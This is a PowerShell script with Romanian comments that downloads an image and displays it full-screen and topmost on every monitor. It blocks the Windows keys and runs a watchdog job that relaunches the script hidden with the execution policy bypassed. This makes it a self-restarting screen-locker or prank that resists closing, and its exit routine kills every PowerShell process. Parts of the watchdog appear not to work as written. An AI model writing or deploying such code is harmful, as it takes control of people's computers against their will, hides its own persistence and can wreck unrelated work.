# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Blocare taste Windows
function Block-WindowsKey {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class WindowsKeyBlocker {
            private const int MOD_WIN = 0x8;
            private const int MOD_NOREPEAT = 0x4000;

            [DllImport("user32.dll")]
            public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

            [DllImport("user32.dll")]
            public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

            public static void Block() {
                RegisterHotKey(IntPtr.Zero, 1, MOD_WIN | MOD_NOREPEAT, 0x5B); // Left Windows Key
                RegisterHotKey(IntPtr.Zero, 2, MOD_WIN | MOD_NOREPEAT, 0x5C); // Right Windows Key
            }

            public static void Unblock() {
                UnregisterHotKey(IntPtr.Zero, 1);
                UnregisterHotKey(IntPtr.Zero, 2);
            }
        }
"@
    [WindowsKeyBlocker]::Block()
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    [WindowsKeyBlocker]::Unblock()
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Funcție de monitorizare pentru repornire automată
function Monitor-Image {
    $scriptPath = $MyInvocation.MyCommand.Definition

    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Pornire aplicație principală și monitorizare
Download-Image
Block-WindowsKey
Start-Job -ScriptBlock { Monitor-Image }
Show-FullScreenImage
